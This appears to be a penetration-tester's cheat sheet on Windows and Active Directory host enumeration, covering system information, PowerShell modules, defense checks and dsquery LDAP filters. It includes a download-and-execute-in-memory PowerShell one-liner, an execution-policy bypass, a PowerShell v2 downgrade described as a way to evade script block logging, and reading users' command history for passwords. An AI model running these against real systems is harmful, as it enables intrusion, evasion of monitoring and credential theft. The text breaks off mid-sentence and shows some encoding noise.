## Basic Enumeration Commands
Prints the **PC's Name**:
``` powershell
hostname
```
Prints out the **OS version** and **revision level**
``` powershell
[System.Environment]::OSVersion.Version
```
Prints the **patches** and **hotfixes** applied to the host
``` powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
Prints out **network adapter state** and configurations
``` powershell
ipconfig /all
```
Displays a **list of environment variables** for the current session (ran from _CMD_-prompt)
``` powershell
set
```
Displays the **domain name** to which the host belongs (ran from _CMD_-prompt)
``` powershell
echo %USERDOMAIN%
```
Prints out the **name of the Domain controller** the host checks in with (ran from _CMD_-prompt)
``` powershell
echo %logonserver%
```
 We can cover the information above with one command `systeminfo`.

 ## Using built-in modules in PowerShell
 PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

- This Cmdlet **lists all the modules currently loaded** for use in your PowerShell session. Modules contain functions, Cmdlets, and resources that extend PowerShell's capabilities.

```powershell
Get-Module
```

- This Cmdlet displays the execution policy settings for each scope on a host. Execution policies determine the conditions under which PowerShell runs scripts and loads configuration files.
```powershell
Get-ExecutionPolicy -List
```

This Cmdlet temporarily changes the execution policy for the current process using the `-Scope` parameter. The change reverts to its original state after the process ends, making it a safe option for non-permanent adjustments on a host.
```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

This Cmdlet retrieves environment variable values such as key paths, usernames, computer information, and more. It is particularly useful for gathering host-related metadata during assessments.
```powershell
Get-ChildItem Env: | ft Key,Value
```

This Cmdlet fetches the PowerShell history of a specific user. This history can contain useful information, such as commands that reveal passwords, file paths, or configuration details.
```powershell
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

This command is a quick and efficient way to download and execute a file from the web directly in memory using PowerShell. The `-nop` (No Profile) parameter ensures PowerShell runs without loading the user profile, while `iex` (Invoke-Expression) executes the downloaded content.
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>'); <follow-on commands>"
```

**Downgrade Powershell**
``` powershell
Get-host
powershell.exe -version 2
```

## Examining the PowerShell **Event Log**
The **PowerShell Operational Log** is a valuable source for tracking PowerShell activity on a system. You can find it at:

> `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`

### üîç **Key Points to Understand**

1. **Command Logging Location**
    - All PowerShell commands executed during a session are logged here.
    - Another useful log is the **Windows PowerShell Log**, found at:
        
        > `Applications and Services Logs > Windows PowerShell`
        
2. **[Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)**
    
    - When **Script Block Logging** is enabled:
        - Everything typed into the PowerShell terminal is recorded.
        - This helps defenders see the full contents of executed scripts or commands.
    - Documentation: [Microsoft Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)
        
3. **Bypassing Logging via PowerShell V2 Downgrade**
    - Downgrading to **PowerShell version 2.0** disables script block logging.
        - Command used: `powershell.exe -version 2`
    - ‚ö†Ô∏è **However**, this downgrade **is itself logged** in the operational log.
        - A vigilant defender can:
            - See the downgrade command.
            - Notice that logging stops for that session.
            - Investigate the suspicious behavior.
                
4. **Example Log Interpretation**
    
    - Entries **before** the downgrade (e.g., PowerShell V5) appear normally in the log.
    - Once downgraded, a new session starts (e.g., HostVersion 2.0), and detailed logs **stop appearing**‚Äîthis gap can raise red flags.

## Checking Defenses
- **Firewall Checks**
``` powershell
netsh advfirewall show allprofiles
```
- **Windows Defender Check (from CMD.exe)**
``` cmd
sc query windefend
```
- we will check the status and configuration settings with the¬†[Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps)¬†cmdlet in PowerShell.
``` powershell
¬†Get-MpComputerStatus
```
- **check and see if you are the only one logged in.**
``` powershell
qwinsta
```

| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

## Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\))¬†is a helpful command-line tool that can be utilized to find Active Directory objects.
- **User Search**
``` powershell
dsquery user
```
- **Computer Search**
``` powershell
dsquery computer
```
- We can use a _dsquery_ wildcard search to **view all objects in an OU**:
``` powershell
dsquery * "CN=Users,DC=Domain,DC=LOCAL"
```
- We can, of course, combine¬†`dsquery`¬†with LDAP search filters of our choosing. The below looks for users with the¬†`PASSWD_NOTREQD`¬†flag set in the¬†`userAccountControl`¬†attribute.
``` powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
- Searching for **Domain Controllers**
``` powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
**NOTE**: These strings are common LDAP queries that can be used with several different tools too `userAccountControl:1.2.840.113556.1.4.803:=8192`
Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:=flag`¬†Specifies that we are looking at the¬†[User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)¬†for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as¬†[Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).  
`=8192`¬†represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like¬†`password is not required`¬†or¬†`account is locked`¬†is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

flags values selected as following
